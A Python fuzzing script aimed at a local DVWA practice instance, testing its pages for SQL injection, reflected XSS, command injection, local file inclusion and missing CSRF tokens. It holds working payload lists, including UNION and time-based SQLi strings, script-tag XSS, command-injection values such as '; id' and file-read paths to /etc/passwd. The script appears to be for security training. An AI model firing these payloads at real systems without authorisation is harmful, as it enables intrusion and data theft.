#!/usr/bin/env python3
"""
Web application fuzzer -- tests DVWA for SQLi, XSS, Command Injection, LFI, and CSRF.

Usage:
    1. Start DVWA: docker run -d -p 80:80 vulnerables/web-dvwa
    2. Log in at http://localhost, go to Setup and click Create Database
    3. Get your PHPSESSID from browser dev tools (Application > Cookies)
    4. Paste it into SESSION_COOKIE below
    5. Run: python3 fuzzer.py
"""

import requests
import time
import re
from datetime import datetime

TARGET = "http://localhost"
SESSION_COOKIE = {"PHPSESSID": "YOUR_SESSION_ID_HERE", "security": "low"}
OUTPUT_FILE = "fuzzer_results.txt"

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' UNION SELECT null,null-- -",
    "' UNION SELECT null,database()-- -",
    "1 AND SLEEP(3)-- -",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert('XSS')>",
]

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "127.0.0.1; id",
    "127.0.0.1 && whoami",
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

SQLI_ERRORS = [
    "You have an error in your SQL syntax",
    "mysql_fetch",
    "Warning: mysql",
    "SQL syntax",
]

def log(msg, f):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line)
    f.write(line + "\n")

def test_sqli(url, param, f):
    log(f"\n[SQLi] {url} | param={param}", f)
    found = []
    for payload in SQLI_PAYLOADS:
        try:
            start = time.time()
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            elapsed = time.time() - start
            for err in SQLI_ERRORS:
                if err.lower() in r.text.lower():
                    log(f"  [VULN] Error-based SQLi -- payload: {payload}", f)
                    found.append(payload)
                    break
            if "SLEEP" in payload.upper() and elapsed > 2.5:
                log(f"  [VULN] Time-based blind SQLi -- took {elapsed:.1f}s", f)
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No SQLi found", f)
    return found

def test_xss(url, param, f):
    log(f"\n[XSS]  {url} | param={param}", f)
    found = []
    for payload in XSS_PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            if payload in r.text:
                log(f"  [VULN] Reflected XSS -- payload reflected: {payload}", f)
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No reflected XSS found", f)
    return found

def test_cmdi(url, param, f):
    log(f"\n[CMDI] {url} | param={param}", f)
    found = []
    for payload in CMDI_PAYLOADS:
        try:
            r = requests.post(url, data={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            for indicator in ["uid=", "root:", "www-data"]:
                if indicator in r.text:
                    log(f"  [VULN] Command injection -- saw '{indicator}'", f)
                    found.append(payload)
                    break
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No command injection found", f)
    return found

def test_lfi(url, param, f):
    log(f"\n[LFI]  {url} | param={param}", f)
    found = []
    for payload in LFI_PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            for indicator in ["root:x:", "daemon:", "/bin/bash"]:
                if indicator in r.text:
                    log(f"  [VULN] LFI -- saw '{indicator}'", f)
                    found.append(payload)
                    break
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No LFI found", f)
    return found

def test_csrf(url, form_fields, f):
    """
    Check whether a state-changing form includes a CSRF token.

    Strategy:
      1. GET the page and parse for a hidden token field
      2. If no token found, submit the form with no Referer header
         (simulates a cross-origin request)
      3. If the server accepts the submission -> CSRF vulnerability confirmed

    This catches the most common case: no token at all. It won't catch
    tokens that exist but aren't validated -- that requires manual testing.
    """
    log(f"\n[CSRF] {url}", f)
    found = []
    try:
        r = requests.get(url, cookies=SESSION_COOKIE, timeout=8)

        token_patterns = [
            r'name=["\'\']user_token["\'\'] value=["\'\']([a-f0-9]+)["\'\']',
            r'name=["\'\']csrf_token["\'\'] value=["\'\']([^\"\'']+)["\'\']',
            r'name=["\'\']_token["\'\'] value=["\'\']([^\"\'']+)["\'\']',
            r'name=["\'\']token["\'\'] value=["\'\']([^\"\'']+)["\'\']',
        ]
        token_found = False
        for pattern in token_patterns:
            match = re.search(pattern, r.text, re.IGNORECASE)
            if match:
                token_found = True
                log(f"  [INFO] CSRF token present", f)
                break

        if not token_found:
            log("  [WARN] No CSRF token found in form -- testing if submission is accepted without one", f)
            headers = {"Referer": ""}
            r2 = requests.get(
                url,
                params=form_fields,
                cookies=SESSION_COOKIE,
                headers=headers,
                timeout=8,
            )
            if r2.status_code == 200 and "login" not in r2.url.lower():
                log(f"  [VULN] CSRF likely -- form submitted without token and server returned 200", f)
                found.append(url)
            else:
                log(f"  [OK] Server rejected tokenless submission (status={r2.status_code})", f)
        else:
            log("  [OK] CSRF token present", f)

    except Exception as e:
        log(f"  [ERR] {e}", f)

    return found

def main():
    all_findings = []
    with open(OUTPUT_FILE, "w") as f:
        log(f"Fuzzer started -- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", f)

        all_findings += [("SQLi", p) for p in test_sqli(f"{TARGET}/dvwa/vulnerabilities/sqli/", "id", f)]
        all_findings += [("XSS", p) for p in test_xss(f"{TARGET}/dvwa/vulnerabilities/xss_r/", "name", f)]
        all_findings += [("CMDI", p) for p in test_cmdi(f"{TARGET}/dvwa/vulnerabilities/exec/", "ip", f)]
        all_findings += [("LFI", p) for p in test_lfi(f"{TARGET}/dvwa/vulnerabilities/fi/", "page", f)]

        csrf_fields = {"password_new": "csrf_test", "password_conf": "csrf_test", "Change": "Change"}
        all_findings += [("CSRF", u) for u in test_csrf(f"{TARGET}/dvwa/vulnerabilities/csrf/", csrf_fields, f)]

        log(f"\nDone. {len(all_findings)} finding(s).", f)
        for t, p in all_findings:
            log(f"  [{t}] {p}", f)

if __name__ == "__main__":
    main()
